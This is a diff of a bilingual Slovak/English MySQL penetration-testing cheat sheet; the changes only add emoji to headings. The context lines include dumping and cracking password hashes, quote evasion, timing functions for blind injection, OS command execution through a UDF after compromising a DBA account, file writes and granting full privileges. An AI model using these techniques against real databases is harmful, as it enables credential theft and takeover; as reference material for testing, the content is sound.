@@ -66,7 +66,7 @@ SELECT host, user, password FROM mysql.user; -- priv
 -- HashCat, John the Ripper will crack MySQL password hashes
 ```
 
-### Zoznam oprávnení/privilégií (List Privileges)	
+### 📜 Zoznam oprávnení/privilégií (List Privileges)	
 ```sql
 --  Zoznam oprávnení/privilégií (List Privileges)	
 SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; -- list user privs
@@ -87,13 +87,13 @@ SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privil
 SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; # priv   
 ```
 
-### Názov aktuálne používanej/pripojenej databázy (Current Database)	
+### ✅ Názov aktuálne používanej/pripojenej databázy (Current Database)	
 ```sql
 -- Názov aktuálne používanej/pripojenej databázy (Current Database)	
 SELECT database()
 ```
 
-### Zoznam databáz (List Databases)	
+### 📚 Zoznam databáz (List Databases)	
 ```sql
 -- Zoznam databáz (List Databases)	
 SHOW databases;
@@ -114,7 +114,7 @@ SHOW tables;
 SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
 ```
 
-###Nájdenie tabulky podľa názvu stĺpca (Find Tables From Column Name)	
+### Nájdenie tabulky podľa názvu stĺpca (Find Tables From Column Name)	
 ```sql
 -- Nájdenie tabulky podľa názvu stĺpca (Find Tables From Column Name)	
 SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username'; -- find table which have a column called 'username'
@@ -133,14 +133,14 @@ SELECT host, user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from
 SELECT substr('abcd', 3, 1); # returns c
 ```
 
-### Bitový AND (Bitwise AND)	
+### 💥 Bitový AND (Bitwise AND)	
 ```sql
 -- Bitový AND (Bitwise AND)	
 SELECT 6 & 2; # returns 2
 SELECT 6 & 1; # returns 0
 ```
 
-### ASCII hodnota (ASCII Value -> Char)
+### 🔠 ASCII hodnota (ASCII Value -> Char)
 ```sql
 -- ASCII hodnota (ASCII Value -> Char)	
 SELECT char(65); # returns A  
@@ -148,7 +148,7 @@ SELECT char(65); # returns A
 SELECT ascii('A'); # returns 65   
 ```
 
-### Pretypovanie (Casting)
+### 💯 Pretypovanie (Casting)
 ```sql
 --  Pretypovanie (Casting)	
 SELECT cast('1' AS unsigned integer);
@@ -174,7 +174,7 @@ SELECT if(1=1,'foo','bar'); -- returns 'foo’
 SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # returns A
 ```
 
-### Vyhnutie sa uvodzovkám (Avoiding Quotes)	
+### 🌶️ Vyhnutie sa uvodzovkám (Avoiding Quotes)	
 ```sql
 -- Vyhnutie sa uvodzovkám (Avoiding Quotes)	
 SELECT 0×414243; # returns ABC
@@ -187,7 +187,7 @@ SELECT BENCHMARK(1000000, MD5('A'));
 SELECT SLEEP(5); # >= 5.0.12
 ```
 
-### Vykonávanie príkazov (Command Execution)	
+### 🧪 Vykonávanie príkazov (Command Execution)	
 ```sql
 -- Vykonávanie príkazov (Command Execution)	
 /* If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
@@ -201,7 +201,7 @@ SELECT SLEEP(5); # >= 5.0.12
 SELECT * FROM mytable INTO dumpfile '/tmp/somefile'; --  priv, write to file system
 ```
 
-### Hostname, IP adresa, číslo portu (najčastejšie 3306-3309)(Hostname, IP Address, port)
+### 💣 Hostname, IP adresa, číslo portu (najčastejšie 3306-3309)(Hostname, IP Address, port)
 ```sql
 -- Hostname, IP adresa, číslo portu (najčastejšie 3306-3309)(Hostname, IP Address, port)
 SELECT @@hostname;
@@ -211,31 +211,31 @@ mysql> \s
 mysql> status
 ```
 
-### Vytvorenie používateľa (Create Users)
+### 🆒 Vytvorenie používateľa (Create Users)
 ```sql
 -- Vytvorenie používateľa (Create Users)
 CREATE USER test1 IDENTIFIED BY 'pass1'; -- priv
 ```
 
-### Vymazanie používateľa (Delete Users)	
+### 🆘 Vymazanie používateľa (Delete Users)	
 ```sql
 -- Vymazanie používateľa (Delete Users)	
 DROP USER test1; -- priv
 ```
 
-### Sprav z používateľa admina (Make User DBA)	
+### 🔥 Sprav z používateľa admina (Make User DBA)	
 ```sql
 -- Sprav z používateľa admina (Make User DBA)	
 GRANT ALL PRIVILEGES ON *.* TO test1@'%'; -- priv
 ```
 
-### Umiestnenie databázových súborov (Location of DB files)	
+### 🔋 Umiestnenie databázových súborov (Location of DB files)	
 ```sql
 -- Umiestnenie databázových súborov (Location of DB files)	
 SELECT @@datadir;
 ```
 
-### Defaultná systémová databáza/schéma (Default/System Database) 
+### ⚡ Defaultná systémová databáza/schéma (Default/System Database) 
 ```sql
 -- Defaultná systémová databáza/schéma (Default/System Database) 
 information_schema -- (>= mysql 5.0)
